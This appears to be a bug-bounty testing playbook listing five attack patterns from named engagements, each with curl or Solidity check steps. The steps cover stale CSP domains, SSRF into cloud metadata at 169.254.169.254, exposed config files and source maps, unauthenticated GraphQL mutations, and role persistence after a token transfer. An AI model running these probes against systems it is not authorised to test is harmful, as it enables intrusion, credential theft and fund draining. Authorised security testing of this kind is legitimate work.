# Proven Attack Patterns

Confirmed-working chains from real engagements. Run these checks on every new target before generic Phase 3 checklist.

## Quick-Check List (run first 15 min of Phase 3)

1. CSP bypass via stale third-party domain
2. SSRF via internal proxy/RPC endpoint
3. Config/source map exposure → credential chain
4. Unauth GraphQL mutations
5. Role/permission persistence after ownership transfer

---

## Pattern 1: CSP Bypass via Stale Third-Party Domain

**Source:** ENS engagement (Critical)
**Trigger:** Target has CSP with third-party domains (analytics, CDN, widgets)
**Chain:** Stale/expired domain in CSP → register it → inject JS → XSS on wallet-connected app

**Check:**
```bash
# Extract CSP domains
curl -sI "https://<target>" | grep -i content-security-policy | grep -oP "https?://[^\s;']+" | sort -u > /tmp/csp_domains.txt

# Check each for availability (DNS NXDOMAIN = potentially registrable)
while read domain; do
  host=$(echo "$domain" | sed 's|https\?://||' | cut -d/ -f1)
  dig +short "$host" | grep -q . || echo "STALE: $host"
done < /tmp/csp_domains.txt
```

**Impact:** Critical ($25K+) — XSS on wallet-connected domain → drain funds
**Applies to:** Any DeFi frontend with CSP allowing third-party script sources

---

## Pattern 2: SSRF via RPC/API Proxy

**Source:** Hacken engagement (CVSS 8.6)
**Trigger:** Target runs its own RPC proxy or API gateway
**Chain:** RPC endpoint accepts arbitrary URLs → SSRF → internal services/cloud metadata

**Check:**
```bash
# Test common RPC proxy patterns
for endpoint in /rpc /api/rpc /proxy /node; do
  curl -s -X POST "https://<target>${endpoint}" \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
done

# If RPC responds, test SSRF
curl -s -X POST "https://<target>/rpc" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"http://169.254.169.254/latest/meta-data/"}],"id":1}'
```

**Impact:** Critical ($25K) — internal service access, cloud metadata
**Applies to:** Any protocol running its own RPC node/proxy

---

## Pattern 3: Config/Source Map Credential Leak

**Source:** Grab/OVO engagement
**Trigger:** JS bundles or config endpoints exposed
**Chain:** config.js/env.js exposed → API keys/internal URLs → chain to authenticated endpoints

**Check:**
```bash
# Config file patterns
for path in /config.js /env.js /config.json /.env.js /runtime-config.js /settings.json; do
  code=$(curl -s -o /tmp/cfg -w "%{http_code}" "https://<target>${path}")
  [ "$code" = "200" ] && echo "EXPOSED: ${path}" && head -20 /tmp/cfg
done

# Source maps
curl -s "https://<target>" | grep -oP '["\x27][^"\x27]*\.js["\x27]' | tr -d "\"'" | head -10 | while read js; do
  map_url="https://<target>/${js}.map"
  code=$(curl -s -o /dev/null -w "%{http_code}" "$map_url")
  [ "$code" = "200" ] && echo "SOURCE MAP: $map_url"
done
```

**Impact:** High-Critical — depends on what's leaked (API keys = High, admin creds = Critical)
**Applies to:** Any target with JS frontend

---

## Pattern 4: Unauth GraphQL Mutations

**Source:** StakeWise engagement (partially — API went OOS)
**Trigger:** Target exposes GraphQL endpoint
**Chain:** Introspection enabled → find mutations → test without auth → write access

**Check:**
```bash
# Find GraphQL
for path in /graphql /api/graphql /v1/graphql /query; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://<target>${path}" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  [ "$code" = "200" ] && echo "GRAPHQL: ${path}"
done

# Introspection
curl -s -X POST "https://<target>/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name } } } }"}' | python3 -m json.tool
```

**Impact:** High-Critical — unauth write = High minimum, fund manipulation = Critical
**Applies to:** Any DeFi protocol with GraphQL backend

---

## Pattern 5: Role Persistence After Transfer

**Source:** ENS contracts-v2 engagement (High)
**Trigger:** Contract has role delegation + NFT/token transfer
**Chain:** Owner delegates role → transfers token → role persists on new owner's asset

**Check:**
```solidity
// In Foundry test:
// 1. Owner grants role to operator
// 2. Owner transfers token to newOwner
// 3. Check: can operator still act on token? (should be revoked)
```

**Impact:** High ($25K-$100K) — unauthorized access persists
**Applies to:** Any contract with delegated permissions + transferable ownership (NFTs, governance tokens, ENS names)

---

## When to Add New Patterns

Add here when ALL conditions met:
- Finding was submitted AND accepted (or confirmed exploitable)
- Pattern applies to more than one target (transferable)
- Check can be automated in <5 minutes
- Not already covered by generic Phase 3/4 checklists
